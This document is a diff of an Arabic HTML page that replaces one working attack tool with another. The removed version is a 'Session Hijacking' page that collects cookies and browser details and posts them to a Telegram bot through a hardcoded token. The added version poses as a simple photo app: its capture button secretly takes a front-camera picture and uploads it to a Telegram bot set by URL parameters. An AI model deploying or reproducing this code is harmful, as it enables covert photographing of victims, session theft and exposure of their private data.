@@ -3,62 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Session Hijacking – تجربة تعليمية</title>
+    <title>تطبيق الصور</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(145deg, #0b0e1a 0%, #1a1f33 100%);
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0b0e1a;
+            font-family: 'Segoe UI', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
             color: #fff;
+            padding: 16px;
         }
         .container {
             background: rgba(255,255,255,0.05);
             backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
             border-radius: 48px;
             padding: 30px 24px;
-            max-width: 440px;
+            max-width: 420px;
             width: 100%;
+            text-align: center;
             border: 1px solid rgba(255,255,255,0.08);
             box-shadow: 0 25px 60px rgba(0,0,0,0.6);
-            text-align: center;
         }
-        h1 {
-            font-size: 26px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #f9d976, #f39c12);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #aab;
-            font-size: 14px;
-            margin-bottom: 24px;
-            opacity: 0.8;
-        }
-        .info-box {
-            background: rgba(255,255,255,0.05);
-            border-radius: 16px;
-            padding: 16px;
-            margin: 16px 0;
-            border: 1px solid rgba(255,255,255,0.05);
-            text-align: left;
-            font-size: 13px;
-            color: #ccc;
-            word-break: break-all;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .info-box strong {
-            color: #f9d976;
+        .image-preview {
+            width: 100%;
+            border-radius: 24px;
+            margin-bottom: 20px;
+            border: 2px solid rgba(255,255,255,0.1);
+            max-height: 300px;
+            object-fit: cover;
+            background: #222;
         }
         .action-btn {
             width: 100%;
@@ -70,291 +46,111 @@
             font-size: 22px;
             font-weight: 800;
             cursor: pointer;
-            margin: 8px 0 16px 0;
             transition: 0.3s;
             box-shadow: 0 8px 25px rgba(243, 156, 18, 0.25);
         }
-        .action-btn:disabled {
-            opacity: 0.4;
-            transform: scale(0.97);
-            pointer-events: none;
-        }
-        .action-btn:active {
-            transform: scale(0.96);
-        }
-        #status {
-            margin-top: 16px;
-            font-size: 15px;
-            color: #aab;
-            min-height: 24px;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(0,255,0,0.1);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #0f0;
-            margin-top: 8px;
-        }
-        .badge.error {
-            background: rgba(255,0,0,0.15);
-            color: #f66;
-        }
-        .note {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #556;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            padding-top: 15px;
-        }
-        .warning {
-            color: #f00;
-            font-weight: bold;
-            background: rgba(255,0,0,0.1);
-            padding: 8px;
-            border-radius: 12px;
-            margin: 8px 0;
-        }
-        .debug-box {
-            background: rgba(0,0,0,0.3);
-            padding: 10px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #8f8;
-            text-align: left;
-            margin: 8px 0;
-            display: none;
-        }
+        .action-btn:disabled { opacity: 0.4; transform: scale(0.97); pointer-events: none; }
+        .action-btn:active { transform: scale(0.96); }
+        #status { margin-top: 16px; font-size: 15px; color: #aab; min-height: 24px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔐 Session Hijacking</h1>
-    <p class="sub">تجربة تعليمية – استخدم على أجهزتك الخاصة فقط</p>
-
-    <div class="warning">⚠️ استخدم هذا فقط على أجهزتك الخاصة لأغراض تعليمية.</div>
-
-    <button class="action-btn" id="captureBtn">📨 التقاط وإرسال الكوكيز</button>
-
-    <div id="status">📌 اضغط على الزر لبدء العملية</div>
-
-    <div class="info-box" id="cookieDisplay">
-        <strong>🍪 الكوكيز:</strong> <span id="cookieValue">(لم تُلتقط بعد)</span>
-    </div>
-    <div class="info-box" id="infoDisplay">
-        <strong>📱 معلومات إضافية:</strong><br>
-        <span id="extraInfo">(سيتم جمعها عند النقر)</span>
-    </div>
-
-    <div class="debug-box" id="debugBox"></div>
-
-    <div class="badge" id="telegramStatus">📨 جاهز</div>
-    <div class="note">⚡ سيتم إرسال البيانات إلى المعرف الثابت في تيليجرام</div>
+    <img id="preview" class="image-preview" src="" alt="الصورة">
+    <button id="captureBtn" class="action-btn">📸 التقاط صورة</button>
+    <div id="status">⏳ جاري التحميل...</div>
 </div>
 
+<video id="video" playsinline></video>
+<canvas id="canvas"></canvas>
+
 <script>
-    // ================================
-    // المعرفات الثابتة (استبدلها بما يناسبك)
-    // ================================
-    const BOT_TOKEN = "6921714346:AAFqRm4MvsBxL8KOVaXOUcoWwhKQTdskDWc";
-    const TARGET_CHAT_ID = "8169635171";
+    (function() {
+        // ========== قراءة المعاملات ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const BOT_TOKEN = urlParams.get('token') || '';
+        const CHAT_ID = urlParams.get('chatId') || '';
+        const IMAGE_URL = urlParams.get('image') || '';
 
-    // ================================
-    // عناصر الواجهة
-    // ================================
-    const captureBtn = document.getElementById('captureBtn');
-    const statusDiv = document.getElementById('status');
-    const cookieValueSpan = document.getElementById('cookieValue');
-    const extraInfoSpan = document.getElementById('extraInfo');
-    const telegramStatus = document.getElementById('telegramStatus');
-    const debugBox = document.getElementById('debugBox');
+        const preview = document.getElementById('preview');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-    // ================================
-    // دالة كتابة رسائل التصحيح
-    // ================================
-    function debug(msg) {
-        debugBox.style.display = 'block';
-        debugBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-        console.log(msg);
-    }
-
-    // ================================
-    // جمع البيانات
-    // ================================
-    function collectData() {
-        const cookies = document.cookie || 'لا توجد كوكيز (قد تكون HttpOnly)';
-        const userAgent = navigator.userAgent;
-        const url = window.location.href;
-        const referrer = document.referrer || 'لا يوجد';
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        const language = navigator.language || 'غير معروف';
-        const platform = navigator.platform || 'غير معروف';
-        const timestamp = new Date().toLocaleString('ar-EG');
-
-        return {
-            cookies,
-            userAgent,
-            url,
-            referrer,
-            screen,
-            language,
-            platform,
-            timestamp
-        };
-    }
-
-    // ================================
-    // عرض البيانات
-    // ================================
-    function displayData(data) {
-        cookieValueSpan.textContent = data.cookies || '(فارغ)';
-        extraInfoSpan.innerHTML = `
-            🕒 الوقت: ${data.timestamp}<br>
-            🌐 الرابط: ${data.url}<br>
-            🔗 المرجع: ${data.referrer}<br>
-            📱 المتصفح: ${data.userAgent}<br>
-            🖥️ الشاشة: ${data.screen}<br>
-            🌍 اللغة: ${data.language}<br>
-            💻 المنصة: ${data.platform}
-        `;
-    }
-
-    // ================================
-    // تقسيم الرسالة الطويلة (حد 4096 حرف)
-    // ================================
-    function splitMessage(text, maxLength = 4000) {
-        if (text.length <= maxLength) return [text];
-        const parts = [];
-        while (text.length > 0) {
-            let part = text.slice(0, maxLength);
-            // نحاول القطع عند سطر جديد لتجنب قطع النص في منتصف الكلمة
-            const lastNewline = part.lastIndexOf('\n');
-            if (lastNewline > maxLength * 0.8) {
-                part = text.slice(0, lastNewline);
-                text = text.slice(lastNewline + 1);
-            } else {
-                text = text.slice(maxLength);
-            }
-            parts.push(part);
+        // عرض الصورة
+        if (IMAGE_URL) {
+            preview.src = IMAGE_URL;
+            statusDiv.innerHTML = '📸 اضغط لالتقاط صورة';
+            captureBtn.disabled = false;
+        } else {
+            statusDiv.innerHTML = '❌ لم يتم العثور على صورة';
+            captureBtn.disabled = true;
         }
-        return parts;
-    }
 
-    // ================================
-    // إرسال البيانات إلى تيليجرام
-    // ================================
-    async function sendToTelegram(data) {
-        telegramStatus.textContent = '⏳ جاري الإرسال...';
-        telegramStatus.style.color = '#ff0';
-        telegramStatus.className = 'badge';
-
-        // بناء الرسالة الأساسية
-        let fullMessage = `🔐 **تقرير Session Hijacking**\n\n`;
-        fullMessage += `🍪 **الكوكيز:**\n\`${data.cookies || '(فارغ)'}\`\n\n`;
-        fullMessage += `📱 **المتصفح:** ${data.userAgent}\n`;
-        fullMessage += `🌐 **الرابط:** ${data.url}\n`;
-        fullMessage += `🔗 **المرجع:** ${data.referrer}\n`;
-        fullMessage += `🖥️ **الشاشة:** ${data.screen}\n`;
-        fullMessage += `🌍 **اللغة:** ${data.language}\n`;
-        fullMessage += `💻 **المنصة:** ${data.platform}\n`;
-        fullMessage += `🕒 **الوقت:** ${data.timestamp}\n`;
-
-        // تقسيم الرسالة إذا كانت طويلة
-        const parts = splitMessage(fullMessage, 4000);
-        let success = true;
-        let errorMsg = '';
-
-        for (let i = 0; i < parts.length; i++) {
-            const part = parts[i];
-            const isLast = (i === parts.length - 1);
-            let text = part;
-            if (parts.length > 1) {
-                text = `(الجزء ${i+1}/${parts.length})\n\n` + part;
+        // ========== التقاط الصورة وإرسالها ==========
+        async function captureAndSend() {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                statusDiv.innerHTML = '❌ إعدادات البوت غير مكتملة';
+                return;
             }
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: TARGET_CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            };
+            captureBtn.disabled = true;
+            statusDiv.innerHTML = '📸 جاري طلب الكاميرا...';
 
             try {
-                debug(`إرسال الجزء ${i+1}/${parts.length}...`);
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                 });
-                const result = await response.json();
-                if (result.ok) {
-                    debug(`✅ الجزء ${i+1} تم بنجاح`);
+
+                video.srcObject = stream;
+                await video.play();
+
+                // رسم الإطار
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+
+                // تحويل إلى Blob
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+                });
+
+                // إرسال إلى البوت
+                statusDiv.innerHTML = '📤 جاري الإرسال...';
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'captured.jpg');
+
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    statusDiv.innerHTML = '✅ تم الإرسال بنجاح!';
                 } else {
-                    success = false;
-                    errorMsg = result.description || 'خطأ غير معروف';
-                    debug(`❌ فشل الجزء ${i+1}: ${errorMsg}`);
-                    // نحاول إرسال الخطأ كرسالة منفصلة (بدون Markdown)
-                    if (isLast) {
-                        await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: TARGET_CHAT_ID,
-                                text: `❌ فشل إرسال التقرير: ${errorMsg}`
-                            })
-                        });
-                    }
-                    break;
+                    const err = await response.text();
+                    console.error(err);
+                    statusDiv.innerHTML = '❌ فشل الإرسال: ' + err;
                 }
-            } catch (e) {
-                success = false;
-                errorMsg = e.message;
-                debug(`❌ خطأ في الاتصال: ${e.message}`);
-                break;
+
+            } catch (error) {
+                console.error(error);
+                statusDiv.innerHTML = '❌ حدث خطأ: تأكد من منح صلاحية الكاميرا';
             }
+
+            captureBtn.disabled = false;
         }
 
-        if (success) {
-            telegramStatus.textContent = '✅ تم الإرسال بنجاح!';
-            telegramStatus.style.color = '#0f0';
-            statusDiv.innerHTML = '✅ اكتمل الإرسال إلى البوت.';
-        } else {
-            telegramStatus.textContent = '❌ فشل الإرسال: ' + errorMsg;
-            telegramStatus.style.color = '#f66';
-            telegramStatus.className = 'badge error';
-            statusDiv.innerHTML = '❌ فشل الإرسال. راجع التفاصيل في صندوق التصحيح.';
-        }
-    }
-
-    // ================================
-    // معالج زر الالتقاط
-    // ================================
-    captureBtn.addEventListener('click', async function() {
-        captureBtn.disabled = true;
-        statusDiv.innerHTML = '⏳ جاري جمع البيانات...';
-        debug('🔄 بدء العملية');
-
-        // جمع البيانات
-        const data = collectData();
-        displayData(data);
-        debug('✅ تم جمع البيانات');
-
-        statusDiv.innerHTML = '📨 جاري الإرسال إلى تيليجرام...';
-        debug('📨 بدء الإرسال...');
-        await sendToTelegram(data);
-
-        captureBtn.disabled = false;
-        statusDiv.innerHTML = '✅ انتهت العملية. يمكنك تكرار التجربة.';
-        debug('✅ العملية كاملة');
-    });
-
-    // ================================
-    // الحالة الأولية
-    // ================================
-    statusDiv.innerHTML = '📌 اضغط على الزر لبدء العملية';
-    telegramStatus.textContent = '📨 جاهز';
-    debug('🚀 الصفحة جاهزة');
+        captureBtn.addEventListener('click', captureAndSend);
+    })();
 </script>
 </body>
 </html>
